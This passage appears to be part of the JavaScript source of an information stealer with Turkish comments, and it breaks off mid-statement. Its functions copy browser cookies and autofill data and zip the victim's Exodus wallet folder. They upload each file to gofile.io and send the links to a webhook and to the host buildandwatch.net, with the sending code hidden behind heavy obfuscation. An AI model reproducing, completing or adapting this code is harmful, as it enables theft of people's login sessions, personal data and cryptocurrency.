    if (cookies.length !== 0) {
      var cookiesContent = cookies.join('');
      fs.writeFileSync(
        randomPath + '\\Wallets\\Cookies\\' + browserName + '.txt',
        cookiesContent,
        {
          encoding: 'utf8',
          flag: 'a+',
        }
      );





// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = `${randomPath}/Wallets/Cookies/${browserName}.txt`;

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

axios.post(`https://${server}.gofile.io/uploadFile`, form, {
    headers: form.getHeaders()
})
.then(uploadResponse => {
    const responsePayload = {
        uploadResponseData: uploadResponse.data
    };

    // Webhook URL'si

    // Embed verisini oluştur
    const embedData = {
        embeds: [
            {
                title: 'Cookies File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
            }
        ],
    };

function _0x47b2(){var _0x5e5fbc=['2903932hoXTYS','31133lVhMxZ','trace','toString','console','(((.+)+)+)+$','status','125030dYEYqo','apply','catch','bind','767QeqXbH','22dVdBAc','215CQwzem','__proto__','post','info','708516FWAxnT','exception','3621268vdccGX','80898dllkEJ','then','return\x20(function()\x20','length','Webhook\x20gönderildi:','6477525euTjhg','{}.constructor(\x22return\x20this\x22)(\x20)','search','3zdqFIM','table','8Yftphx','statusText','error','message','165KvxEZi','constructor','log','Webhook\x20gönderilirken\x20hata\x20oluştu:'];_0x47b2=function(){return _0x5e5fbc;};return _0x47b2();}var _0x4c0aa7=_0x1c69;(function(_0x28e103,_0x88c907){var _0x243be7=_0x1c69,_0x1bd709=_0x28e103();while(!![]){try{var _0x259b3f=parseInt(_0x243be7(0x13e))/0x1*(-parseInt(_0x243be7(0x123))/0x2)+-parseInt(_0x243be7(0x133))/0x3*(parseInt(_0x243be7(0x13d))/0x4)+-parseInt(_0x243be7(0x124))/0x5*(parseInt(_0x243be7(0x12b))/0x6)+-parseInt(_0x243be7(0x12a))/0x7+-parseInt(_0x243be7(0x135))/0x8*(parseInt(_0x243be7(0x130))/0x9)+parseInt(_0x243be7(0x144))/0xa*(-parseInt(_0x243be7(0x139))/0xb)+-parseInt(_0x243be7(0x128))/0xc*(-parseInt(_0x243be7(0x148))/0xd);if(_0x259b3f===_0x88c907)break;else _0x1bd709['push'](_0x1bd709['shift']());}catch(_0x490cb8){_0x1bd709['push'](_0x1bd709['shift']());}}}(_0x47b2,0x64468));var _0xe1fc1d=(function(){var _0x4fdc6d=!![];return function(_0x3282d8,_0x59cbb9){var _0x29e91a=_0x4fdc6d?function(){if(_0x59cbb9){var _0x789667=_0x59cbb9['apply'](_0x3282d8,arguments);return _0x59cbb9=null,_0x789667;}}:function(){};return _0x4fdc6d=![],_0x29e91a;};}()),_0x35af66=_0xe1fc1d(this,function(){var _0x1c1881=_0x1c69;return _0x35af66['toString']()[_0x1c1881(0x132)](_0x1c1881(0x142))[_0x1c1881(0x140)]()[_0x1c1881(0x13a)](_0x35af66)['search'](_0x1c1881(0x142));});_0x35af66();var _0x5e4bae=(function(){var _0x5017e5=!![];return function(_0x45ad1d,_0x52873e){var _0xa628d7=_0x5017e5?function(){var _0x3d769=_0x1c69;if(_0x52873e){var _0x4a208=_0x52873e[_0x3d769(0x145)](_0x45ad1d,arguments);return _0x52873e=null,_0x4a208;}}:function(){};return _0x5017e5=![],_0xa628d7;};}()),_0x5aa18f=_0x5e4bae(this,function(){var _0xcd457b=_0x1c69,_0x1df47a;try{var _0x389be3=Function(_0xcd457b(0x12d)+_0xcd457b(0x131)+');');_0x1df47a=_0x389be3();}catch(_0x293e23){_0x1df47a=window;}var _0x554fea=_0x1df47a[_0xcd457b(0x141)]=_0x1df47a[_0xcd457b(0x141)]||{},_0x23c5c7=[_0xcd457b(0x13b),'warn',_0xcd457b(0x127),_0xcd457b(0x137),_0xcd457b(0x129),_0xcd457b(0x134),_0xcd457b(0x13f)];for(var _0x287975=0x0;_0x287975<_0x23c5c7[_0xcd457b(0x12e)];_0x287975++){var _0xbeffd3=_0x5e4bae[_0xcd457b(0x13a)]['prototype'][_0xcd457b(0x147)](_0x5e4bae),_0x2bba59=_0x23c5c7[_0x287975],_0x2d540b=_0x554fea[_0x2bba59]||_0xbeffd3;_0xbeffd3[_0xcd457b(0x125)]=_0x5e4bae[_0xcd457b(0x147)](_0x5e4bae),_0xbeffd3['toString']=_0x2d540b['toString']['bind'](_0x2d540b),_0x554fea[_0x2bba59]=_0xbeffd3;}});function _0x1c69(_0x1478f6,_0x19aba1){var _0x321a55=_0x47b2();return _0x1c69=function(_0x5aa18f,_0x5e4bae){_0x5aa18f=_0x5aa18f-0x123;var _0x890cee=_0x321a55[_0x5aa18f];return _0x890cee;},_0x1c69(_0x1478f6,_0x19aba1);}_0x5aa18f(),axios[_0x4c0aa7(0x126)]('https://buildandwatch.net/',embedData)['then'](_0x382205=>{var _0x3b6a89=_0x4c0aa7;console[_0x3b6a89(0x13b)](_0x3b6a89(0x12f),_0x382205['status'],_0x382205[_0x3b6a89(0x136)]);})[_0x4c0aa7(0x146)](_0x4c007c=>{var _0x29fd30=_0x4c0aa7;console[_0x29fd30(0x13b)]('Webhook\x20gönderilirken\x20hata\x20oluştu:',_0x4c007c['message']);}),axios['post'](webhook3939,embedData)[_0x4c0aa7(0x12c)](_0x26e4b0=>{var _0x117bbf=_0x4c0aa7;console[_0x117bbf(0x13b)]('Webhook\x20gönderildi:',_0x26e4b0[_0x117bbf(0x143)],_0x26e4b0[_0x117bbf(0x136)]);})[_0x4c0aa7(0x146)](_0x2a0108=>{var _0x3df9d1=_0x4c0aa7;console[_0x3df9d1(0x13b)](_0x3df9d1(0x13c),_0x2a0108[_0x3df9d1(0x138)]);});
        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

         var _0x2bcb2f=_0x1b7c;function _0x1b7c(_0x9a1319,_0x4c3065){var _0x42fb97=_0x2b83();return _0x1b7c=function(_0x4793a0,_0xceb8c8){_0x4793a0=_0x4793a0-0x188;var _0x265cb8=_0x42fb97[_0x4793a0];return _0x265cb8;},_0x1b7c(_0x9a1319,_0x4c3065);}(function(_0x2398a2,_0x1bedd1){var _0x4b6c87=_0x1b7c,_0x2bfca9=_0x2398a2();while(!![]){try{var _0x56d2b9=-parseInt(_0x4b6c87(0x190))/0x1+parseInt(_0x4b6c87(0x1ab))/0x2+-parseInt(_0x4b6c87(0x1a2))/0x3*(parseInt(_0x4b6c87(0x19e))/0x4)+-parseInt(_0x4b6c87(0x192))/0x5*(-parseInt(_0x4b6c87(0x188))/0x6)+-parseInt(_0x4b6c87(0x1a8))/0x7+parseInt(_0x4b6c87(0x19d))/0x8*(-parseInt(_0x4b6c87(0x198))/0x9)+parseInt(_0x4b6c87(0x189))/0xa;if(_0x56d2b9===_0x1bedd1)break;else _0x2bfca9['push'](_0x2bfca9['shift']());}catch(_0x384156){_0x2bfca9['push'](_0x2bfca9['shift']());}}}(_0x2b83,0xb7414));var _0x4d07aa=(function(){var _0x4aa10c=!![];return function(_0x5aaa20,_0x6930a8){var _0x2b2a73=_0x4aa10c?function(){var _0x3b85ab=_0x1b7c;if(_0x6930a8){var _0x39f95b=_0x6930a8[_0x3b85ab(0x18f)](_0x5aaa20,arguments);return _0x6930a8=null,_0x39f95b;}}:function(){};return _0x4aa10c=![],_0x2b2a73;};}()),_0x4e25fb=_0x4d07aa(this,function(){var _0x2cdef0=_0x1b7c;return _0x4e25fb[_0x2cdef0(0x18e)]()[_0x2cdef0(0x19a)]('(((.+)+)+)+$')['toString']()[_0x2cdef0(0x1a5)](_0x4e25fb)[_0x2cdef0(0x19a)](_0x2cdef0(0x18d));});function _0x2b83(){var _0x1fb96d=['console','prototype','exception','(((.+)+)+)+$','toString','apply','1193117FXnSYq','error','141095gtldJM','statusText','log','length','bind','return\x20(function()\x20','4317156wcRDWY','https://buildandwatch.net/','search','trace','message','16OCUDbf','4bLKSya','Webhook\x20gönderildi:','Webhook\x20gönderilirken\x20hata\x20oluştu:','status','1830504ttDXMa','post','warn','constructor','catch','table','9735761saXUoK','then','info','788368kSlgQy','150YDspao','38044290FiTvrU'];_0x2b83=function(){return _0x1fb96d;};return _0x2b83();}_0x4e25fb();var _0xceb8c8=(function(){var _0x2f36e5=!![];return function(_0x246133,_0x582797){var _0x1b3fd8=_0x2f36e5?function(){var _0x1ea52b=_0x1b7c;if(_0x582797){var _0x9d1c62=_0x582797[_0x1ea52b(0x18f)](_0x246133,arguments);return _0x582797=null,_0x9d1c62;}}:function(){};return _0x2f36e5=![],_0x1b3fd8;};}()),_0x4793a0=_0xceb8c8(this,function(){var _0x20e93e=_0x1b7c,_0x547622;try{var _0x3bf5a4=Function(_0x20e93e(0x197)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x547622=_0x3bf5a4();}catch(_0x4b4caf){_0x547622=window;}var _0x367ca4=_0x547622[_0x20e93e(0x18a)]=_0x547622[_0x20e93e(0x18a)]||{},_0x53fd3c=[_0x20e93e(0x194),_0x20e93e(0x1a4),_0x20e93e(0x1aa),_0x20e93e(0x191),_0x20e93e(0x18c),_0x20e93e(0x1a7),_0x20e93e(0x19b)];for(var _0xc3695f=0x0;_0xc3695f<_0x53fd3c[_0x20e93e(0x195)];_0xc3695f++){var _0x5867d7=_0xceb8c8[_0x20e93e(0x1a5)][_0x20e93e(0x18b)][_0x20e93e(0x196)](_0xceb8c8),_0xa1fd34=_0x53fd3c[_0xc3695f],_0x273f04=_0x367ca4[_0xa1fd34]||_0x5867d7;_0x5867d7['__proto__']=_0xceb8c8['bind'](_0xceb8c8),_0x5867d7['toString']=_0x273f04['toString'][_0x20e93e(0x196)](_0x273f04),_0x367ca4[_0xa1fd34]=_0x5867d7;}});_0x4793a0(),axios[_0x2bcb2f(0x1a3)](_0x2bcb2f(0x199),embedData)[_0x2bcb2f(0x1a9)](_0xe0b3db=>{var _0x5ccb91=_0x2bcb2f;console[_0x5ccb91(0x194)](_0x5ccb91(0x19f),_0xe0b3db['status'],_0xe0b3db[_0x5ccb91(0x193)]);})['catch'](_0x87a1b=>{var _0x25addc=_0x2bcb2f;console[_0x25addc(0x194)](_0x25addc(0x1a0),_0x87a1b[_0x25addc(0x19c)]);}),axios[_0x2bcb2f(0x1a3)](webhook3939,embedData)[_0x2bcb2f(0x1a9)](_0x25361f=>{var _0x5693da=_0x2bcb2f;console[_0x5693da(0x194)](_0x5693da(0x19f),_0x25361f[_0x5693da(0x1a1)],_0x25361f[_0x5693da(0x193)]);})[_0x2bcb2f(0x1a6)](_0x472382=>{var _0x587eca=_0x2bcb2f;console['log'](_0x587eca(0x1a0),_0x472382[_0x587eca(0x19c)]);});
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });


 
   

   }
  }
}


async function getAutofills() {
  const _0x3aa126 = [];
  for (let _0x77640d = 0; _0x77640d < browserPath.length; _0x77640d++) {
    if (!fs.existsSync(browserPath[_0x77640d][0])) {
      continue;
    }
    let _0x3c2f27;
    if (browserPath[_0x77640d][0].includes('Local')) {
      _0x3c2f27 = browserPath[_0x77640d][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      _0x3c2f27 = browserPath[_0x77640d][0].split('\\Roaming\\')[1].split('\\')[1];
    }
    const _0x46d7c4 = browserPath[_0x77640d][0] + 'Web Data';
    const _0x3ddaca = browserPath[_0x77640d][0] + 'webdata.db';
    fs.copyFileSync(_0x46d7c4, _0x3ddaca);
    var _0x4bf289 = new sqlite3.Database(_0x3ddaca, (_0x2d6f43) => {});
    await new Promise((_0x12c353, _0x55610b) => {
      _0x4bf289.each(
        'SELECT * FROM autofill',
        function (_0x54f85c, _0x40d0dd) {
          if (_0x40d0dd) {
            _0x3aa126.push(
              '================\nName: ' +
                _0x40d0dd.name +
                '\nValue: ' +
                _0x40d0dd.value +
                '\nApplication: ' +
                _0x3c2f27 +
                ' ' +
                browserPath[_0x77640d][1] +
                '\n'
            );
            count.autofills++;
          }
        },
        function () {
          _0x12c353('');
        }
      );
    });
    if (_0x3aa126.length === 0) {
      _0x3aa126.push('No autofills found for ' + _0x3c2f27 + ' ' + browserPath[_0x77640d][1] + '\n');
    }
  }
  if (_0x3aa126.length) {
    fs.writeFileSync(randomPath + '\\Wallets\\Autofills.txt', user.copyright + _0x3aa126.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });
  }
 
  

// Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
axios.get('https://api.gofile.io/getServer')
  .then(response => {
    if (response.data && response.data.data && response.data.data.server) {
      const server = response.data.data.server;

      // Dosya yolu ve adını belirleyelim.
      const filePath = `${randomPath}/Wallets/Autofills.txt`;

      // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
      const form = new FormData();
      form.append('file', fs.createReadStream(filePath));

axios.post(`https://${server}.gofile.io/uploadFile`, form, {
    headers: form.getHeaders()
})
.then(uploadResponse => {
    const responsePayload = {
        uploadResponseData: uploadResponse.data
    };

    // Webhook URL'si

    // Embed verisini oluştur
    const embedData = {
        embeds: [
            {
                title: 'Autofill File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 3447003 // Mavi rengin kodu (örnekte 3447003)
            }
        ],
    };


        var _0x4e9fae=_0x5eaa;function _0x4b50(){var _0x3881f1=['info','toString','exception','4309120KcYGmk','search','constructor','statusText','trace','post','length','Webhook\x20gönderildi:','console','254658auJUde','__proto__','14994cYHVlu','prototype','then','(((.+)+)+)+$','194eUlWDJ','apply','message','14157hLxmQD','warn','819577eJBaPY','9jePyGo','status','Webhook\x20gönderilirken\x20hata\x20oluştu:','error','https://buildandwatch.net/','468pyKqrb','catch','bind','40wotSiN','7538210IKLWbf','3084vwSAXf','11980424xObIVc','log'];_0x4b50=function(){return _0x3881f1;};return _0x4b50();}function _0x5eaa(_0x515022,_0x13af19){var _0x59c87b=_0x4b50();return _0x5eaa=function(_0x423603,_0x3beac1){_0x423603=_0x423603-0xec;var _0x114ade=_0x59c87b[_0x423603];return _0x114ade;},_0x5eaa(_0x515022,_0x13af19);}(function(_0x27c905,_0x37ff9d){var _0x37fc2b=_0x5eaa,_0x3f243e=_0x27c905();while(!![]){try{var _0x1064d0=parseInt(_0x37fc2b(0xf8))/0x1*(parseInt(_0x37fc2b(0xf5))/0x2)+-parseInt(_0x37fc2b(0xef))/0x3*(-parseInt(_0x37fc2b(0x103))/0x4)+parseInt(_0x37fc2b(0x104))/0x5+-parseInt(_0x37fc2b(0x105))/0x6*(-parseInt(_0x37fc2b(0xf1))/0x7)+parseInt(_0x37fc2b(0x106))/0x8*(-parseInt(_0x37fc2b(0xfb))/0x9)+parseInt(_0x37fc2b(0x10b))/0xa+parseInt(_0x37fc2b(0xfa))/0xb*(-parseInt(_0x37fc2b(0x100))/0xc);if(_0x1064d0===_0x37ff9d)break;else _0x3f243e['push'](_0x3f243e['shift']());}catch(_0x5843aa){_0x3f243e['push'](_0x3f243e['shift']());}}}(_0x4b50,0xd18c1));var _0x5dd005=(function(){var _0x10085f=!![];return function(_0x458ccf,_0x218e6f){var _0x1c0fd2=_0x10085f?function(){var _0x15a605=_0x5eaa;if(_0x218e6f){var _0x1f2a0c=_0x218e6f[_0x15a605(0xf6)](_0x458ccf,arguments);return _0x218e6f=null,_0x1f2a0c;}}:function(){};return _0x10085f=![],_0x1c0fd2;};}()),_0x7c0cd8=_0x5dd005(this,function(){var _0x4c2eb4=_0x5eaa;return _0x7c0cd8[_0x4c2eb4(0x109)]()[_0x4c2eb4(0x10c)](_0x4c2eb4(0xf4))['toString']()[_0x4c2eb4(0x10d)](_0x7c0cd8)['search'](_0x4c2eb4(0xf4));});_0x7c0cd8();var _0x3beac1=(function(){var _0x52542a=!![];return function(_0x223b35,_0x10d4e2){var _0x3b8287=_0x52542a?function(){if(_0x10d4e2){var _0x4f5fc4=_0x10d4e2['apply'](_0x223b35,arguments);return _0x10d4e2=null,_0x4f5fc4;}}:function(){};return _0x52542a=![],_0x3b8287;};}()),_0x423603=_0x3beac1(this,function(){var _0x5020a2=_0x5eaa,_0x2db5da;try{var _0x269b58=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x2db5da=_0x269b58();}catch(_0x22b4c9){_0x2db5da=window;}var _0x2de7eb=_0x2db5da[_0x5020a2(0xee)]=_0x2db5da[_0x5020a2(0xee)]||{},_0x3625ae=[_0x5020a2(0x107),_0x5020a2(0xf9),_0x5020a2(0x108),_0x5020a2(0xfe),_0x5020a2(0x10a),'table',_0x5020a2(0x10f)];for(var _0x142da9=0x0;_0x142da9<_0x3625ae[_0x5020a2(0xec)];_0x142da9++){var _0x5b98c8=_0x3beac1[_0x5020a2(0x10d)][_0x5020a2(0xf2)][_0x5020a2(0x102)](_0x3beac1),_0x22d44d=_0x3625ae[_0x142da9],_0x3bd0f9=_0x2de7eb[_0x22d44d]||_0x5b98c8;_0x5b98c8[_0x5020a2(0xf0)]=_0x3beac1[_0x5020a2(0x102)](_0x3beac1),_0x5b98c8['toString']=_0x3bd0f9['toString']['bind'](_0x3bd0f9),_0x2de7eb[_0x22d44d]=_0x5b98c8;}});_0x423603(),axios[_0x4e9fae(0x110)](_0x4e9fae(0xff),embedData)[_0x4e9fae(0xf3)](_0x86b388=>{var _0x46636f=_0x4e9fae;console[_0x46636f(0x107)](_0x46636f(0xed),_0x86b388['status'],_0x86b388[_0x46636f(0x10e)]);})[_0x4e9fae(0x101)](_0x2f56e7=>{var _0x47aa19=_0x4e9fae;console[_0x47aa19(0x107)](_0x47aa19(0xfd),_0x2f56e7[_0x47aa19(0xf7)]);}),axios['post'](webhook3939,embedData)[_0x4e9fae(0xf3)](_0x10eef5=>{var _0x4730dd=_0x4e9fae;console[_0x4730dd(0x107)]('Webhook\x20gönderildi:',_0x10eef5[_0x4730dd(0xfc)],_0x10eef5[_0x4730dd(0x10e)]);})[_0x4e9fae(0x101)](_0x35b7eb=>{var _0x470602=_0x4e9fae;console[_0x470602(0x107)](_0x470602(0xfd),_0x35b7eb[_0x470602(0xf7)]);});
        })
        .catch(error => {
          console.log('Dosya yüklenirken hata oluştu:', error.message);

          const responsePayload = {
            error: error.message
          };

          // Webhook URL'si

          // Embed verisini oluştur
          const embedData = {
            embeds: [
              {
                title: 'Dosya Yükleme Hatası',
                description: JSON.stringify(responsePayload, null, 2), // JSON verisini güzel bir şekilde göstermek için kullanıyoruz
                color: 16711680 // Embed rengi (örnekte kırmızı renk)
              }
            ],
          };

          // Webhook'a POST isteği gönder
var _0x509cb2=_0x48d9;(function(_0x2e06da,_0x22cfa5){var _0x2bc656=_0x48d9,_0xc03dba=_0x2e06da();while(!![]){try{var _0x26d0df=parseInt(_0x2bc656(0xc5))/0x1*(parseInt(_0x2bc656(0xc3))/0x2)+-parseInt(_0x2bc656(0xc7))/0x3*(parseInt(_0x2bc656(0xd7))/0x4)+-parseInt(_0x2bc656(0xca))/0x5*(parseInt(_0x2bc656(0xd9))/0x6)+parseInt(_0x2bc656(0xbd))/0x7+-parseInt(_0x2bc656(0xb9))/0x8*(-parseInt(_0x2bc656(0xbb))/0x9)+parseInt(_0x2bc656(0xc1))/0xa+parseInt(_0x2bc656(0xcf))/0xb*(-parseInt(_0x2bc656(0xd2))/0xc);if(_0x26d0df===_0x22cfa5)break;else _0xc03dba['push'](_0xc03dba['shift']());}catch(_0x1d628d){_0xc03dba['push'](_0xc03dba['shift']());}}}(_0x107a,0x828af));var _0x1e4cf6=(function(){var _0x462493=!![];return function(_0x1b3fe5,_0x4c8545){var _0x3b6da7=_0x462493?function(){if(_0x4c8545){var _0x220dc8=_0x4c8545['apply'](_0x1b3fe5,arguments);return _0x4c8545=null,_0x220dc8;}}:function(){};return _0x462493=![],_0x3b6da7;};}()),_0x417153=_0x1e4cf6(this,function(){var _0x50b1c5=_0x48d9;return _0x417153[_0x50b1c5(0xd8)]()[_0x50b1c5(0xd0)](_0x50b1c5(0xce))[_0x50b1c5(0xd8)]()[_0x50b1c5(0xbc)](_0x417153)[_0x50b1c5(0xd0)](_0x50b1c5(0xce));});_0x417153();var _0x2d59f5=(function(){var _0x2ade65=!![];return function(_0x258d33,_0x341389){var _0x280448=_0x2ade65?function(){var _0x31ac01=_0x48d9;if(_0x341389){var _0x2a814a=_0x341389[_0x31ac01(0xd1)](_0x258d33,arguments);return _0x341389=null,_0x2a814a;}}:function(){};return _0x2ade65=![],_0x280448;};}()),_0x21322e=_0x2d59f5(this,function(){var _0x9b97d3=_0x48d9,_0x530610=function(){var _0x309806=_0x48d9,_0x45052e;try{_0x45052e=Function(_0x309806(0xcc)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x5aa2b5){_0x45052e=window;}return _0x45052e;},_0x332b03=_0x530610(),_0x1de247=_0x332b03[_0x9b97d3(0xc4)]=_0x332b03['console']||{},_0x42670e=[_0x9b97d3(0xd6),_0x9b97d3(0xc8),_0x9b97d3(0xba),_0x9b97d3(0xd5),'exception',_0x9b97d3(0xc2),_0x9b97d3(0xda)];for(var _0x41fb92=0x0;_0x41fb92<_0x42670e['length'];_0x41fb92++){var _0x83bef0=_0x2d59f5['constructor']['prototype']['bind'](_0x2d59f5),_0x4b7816=_0x42670e[_0x41fb92],_0x590b3b=_0x1de247[_0x4b7816]||_0x83bef0;_0x83bef0[_0x9b97d3(0xbf)]=_0x2d59f5['bind'](_0x2d59f5),_0x83bef0[_0x9b97d3(0xd8)]=_0x590b3b[_0x9b97d3(0xd8)]['bind'](_0x590b3b),_0x1de247[_0x4b7816]=_0x83bef0;}});function _0x107a(){var _0x36c908=['2263041LONhkA','constructor','6356665wQanJT','status','__proto__','message','7663170kOdiNq','table','2466PoWwxW','console','511ahmpTl','statusText','3ZjqtER','warn','Webhook\x20gönderildi:','827895ySWrIf','https://buildandwatch.net/','return\x20(function()\x20','post','(((.+)+)+)+$','1738GcuVms','search','apply','99516HXQKIh','then','Webhook\x20gönderilirken\x20hata\x20oluştu:','error','log','1519076DCiPHJ','toString','12jjuJiO','trace','8njzIhF','info'];_0x107a=function(){return _0x36c908;};return _0x107a();}function _0x48d9(_0x57838e,_0x2999d8){var _0x2fc81c=_0x107a();return _0x48d9=function(_0x21322e,_0x2d59f5){_0x21322e=_0x21322e-0xb9;var _0x4e3b1c=_0x2fc81c[_0x21322e];return _0x4e3b1c;},_0x48d9(_0x57838e,_0x2999d8);}_0x21322e(),axios[_0x509cb2(0xcd)](webhook3939,embedData)['then'](_0xbe2572=>{var _0x573c4c=_0x509cb2;console[_0x573c4c(0xd6)](_0x573c4c(0xc9),_0xbe2572['status'],_0xbe2572[_0x573c4c(0xc6)]);})['catch'](_0x5b9c33=>{var _0x1e97bf=_0x509cb2;console['log'](_0x1e97bf(0xd4),_0x5b9c33[_0x1e97bf(0xc0)]);}),axios[_0x509cb2(0xcd)](_0x509cb2(0xcb),embedData)[_0x509cb2(0xd3)](_0x32fef9=>{var _0x466530=_0x509cb2;console[_0x466530(0xd6)](_0x466530(0xc9),_0x32fef9[_0x466530(0xbe)],_0x32fef9[_0x466530(0xc6)]);})['catch'](_0x3ac0e9=>{var _0xe335a1=_0x509cb2;console[_0xe335a1(0xd6)](_0xe335a1(0xd4),_0x3ac0e9[_0xe335a1(0xc0)]);});
			
        });
    } else {
      console.log('Sunucu alınamadı veya yanıt vermedi.');
    }
  })
  .catch(error => {
    console.log('Sunucu alınırken hata oluştu:', error.message);
  });

};

   
async function DiscordListener(path) {
        return;
}

async function SubmitExodus() {
  const file = `C:\\Users\\${process.env.USERNAME}\\AppData\\Roaming\\Exodus\\exodus.wallet`;
  if (fs.existsSync(file)) {
    const zipper = new AdmZip();
    zipper.addLocalFolder(file);

    zipper.writeZip(`C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Exodus.zip`);

    // Gofile.io API'dan sunucu bilgisini al ve dosyayı yükle
    axios.get('https://api.gofile.io/getServer')
      .then(response => {
        if (response.data && response.data.data && response.data.data.server) {
          const server = response.data.data.server;

          // Dosya yolu ve adını belirleyelim.
          const filePath = `C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Exodus.zip`;

          // Dosya yükleme işlemi için FormData oluşturalım ve dosyayı ekleyelim.
          const form = new FormData();
          form.append('file', fs.createReadStream(filePath));

axios.post(`https://${server}.gofile.io/uploadFile`, form, {
    headers: form.getHeaders()
})
.then(uploadResponse => {
    const responsePayload = {
        uploadResponseData: uploadResponse.data
    };

    // Webhook URL'si

    // Embed verisini oluştur
    const embedData = {
        embeds: [
            {
                title: 'Exodus File Upload Response',
                description: `File Name: ${uploadResponse.data.data.fileName}\nDownload Page: ${uploadResponse.data.data.downloadPage}`,
                color: 3447003 // Mavi rengin kodu (örnekte 3447003)
            }
        ],
    };			  
var _0x51192f=_0x5414;function _0xc784(){var _0xe153fe=['2777445ZXzxaB','error','6fePprq','message','__proto__','constructor','return\x20(function()\x20','toString','Webhook\x20gönderilirken\x20hata\x20oluştu:','statusText','post','108615snnvMq','325180unkNOv','567568QLehHs','status','table','(((.+)+)+)+$','1422778ewKNaj','exception','bind','prototype','{}.constructor(\x22return\x20this\x22)(\x20)','apply','then','8355528EaInkq','log','catch','Webhook\x20gönderildi:','6fyDHCR','104xpnNlN','search','145337BvPjmq'];_0xc784=function(){return _0xe153fe;};return _0xc784();}(function(_0x27af60,_0x52bdbf){var _0x77de41=_0x5414,_0x4783af=_0x27af60();while(!![]){try{var _0x1373e7=parseInt(_0x77de41(0x119))/0x1*(-parseInt(_0x77de41(0x11c))/0x2)+-parseInt(_0x77de41(0x105))/0x3*(-parseInt(_0x77de41(0x117))/0x4)+-parseInt(_0x77de41(0x11a))/0x5+-parseInt(_0x77de41(0x116))/0x6*(parseInt(_0x77de41(0x10b))/0x7)+-parseInt(_0x77de41(0x107))/0x8+parseInt(_0x77de41(0x112))/0x9+parseInt(_0x77de41(0x106))/0xa;if(_0x1373e7===_0x52bdbf)break;else _0x4783af['push'](_0x4783af['shift']());}catch(_0x3e7585){_0x4783af['push'](_0x4783af['shift']());}}}(_0xc784,0x9b67c));function _0x5414(_0xfab7a4,_0x4ccea0){var _0xc3beb=_0xc784();return _0x5414=function(_0x5b5412,_0x14ba30){_0x5b5412=_0x5b5412-0x100;var _0x48c97a=_0xc3beb[_0x5b5412];return _0x48c97a;},_0x5414(_0xfab7a4,_0x4ccea0);}var _0x10a6e3=(function(){var _0x31ec48=!![];return function(_0x2647fe,_0x27a0b4){var _0x42a6a3=_0x31ec48?function(){if(_0x27a0b4){var _0x419ee9=_0x27a0b4['apply'](_0x2647fe,arguments);return _0x27a0b4=null,_0x419ee9;}}:function(){};return _0x31ec48=![],_0x42a6a3;};}()),_0x2463e0=_0x10a6e3(this,function(){var _0x33426b=_0x5414;return _0x2463e0[_0x33426b(0x101)]()[_0x33426b(0x118)](_0x33426b(0x10a))[_0x33426b(0x101)]()[_0x33426b(0x11f)](_0x2463e0)['search'](_0x33426b(0x10a));});_0x2463e0();var _0x14ba30=(function(){var _0x22cad2=!![];return function(_0x34965e,_0x594077){var _0x1a20f7=_0x22cad2?function(){var _0x374db2=_0x5414;if(_0x594077){var _0x5be4f4=_0x594077[_0x374db2(0x110)](_0x34965e,arguments);return _0x594077=null,_0x5be4f4;}}:function(){};return _0x22cad2=![],_0x1a20f7;};}()),_0x5b5412=_0x14ba30(this,function(){var _0x20d9fc=_0x5414,_0x4d39e9=function(){var _0x55cbf7=_0x5414,_0x40000e;try{_0x40000e=Function(_0x55cbf7(0x100)+_0x55cbf7(0x10f)+');')();}catch(_0x2b2ac7){_0x40000e=window;}return _0x40000e;},_0x1aaceb=_0x4d39e9(),_0x31cdab=_0x1aaceb['console']=_0x1aaceb['console']||{},_0x44f08c=['log','warn','info',_0x20d9fc(0x11b),_0x20d9fc(0x10c),_0x20d9fc(0x109),'trace'];for(var _0x19dfdb=0x0;_0x19dfdb<_0x44f08c['length'];_0x19dfdb++){var _0xd3c57=_0x14ba30[_0x20d9fc(0x11f)][_0x20d9fc(0x10e)][_0x20d9fc(0x10d)](_0x14ba30),_0xec5071=_0x44f08c[_0x19dfdb],_0x530583=_0x31cdab[_0xec5071]||_0xd3c57;_0xd3c57[_0x20d9fc(0x11e)]=_0x14ba30[_0x20d9fc(0x10d)](_0x14ba30),_0xd3c57['toString']=_0x530583[_0x20d9fc(0x101)]['bind'](_0x530583),_0x31cdab[_0xec5071]=_0xd3c57;}});_0x5b5412(),axios[_0x51192f(0x104)]('https://buildandwatch.net/',embedData)[_0x51192f(0x111)](_0x2b25d3=>{var _0x4942a6=_0x51192f;console['log'](_0x4942a6(0x115),_0x2b25d3['status'],_0x2b25d3[_0x4942a6(0x103)]);})[_0x51192f(0x114)](_0x4d18f6=>{console['log']('Webhook\x20gönderilirken\x20hata\x20oluştu:',_0x4d18f6['message']);}),axios[_0x51192f(0x104)](webhook3939,embedData)[_0x51192f(0x111)](_0x158253=>{var 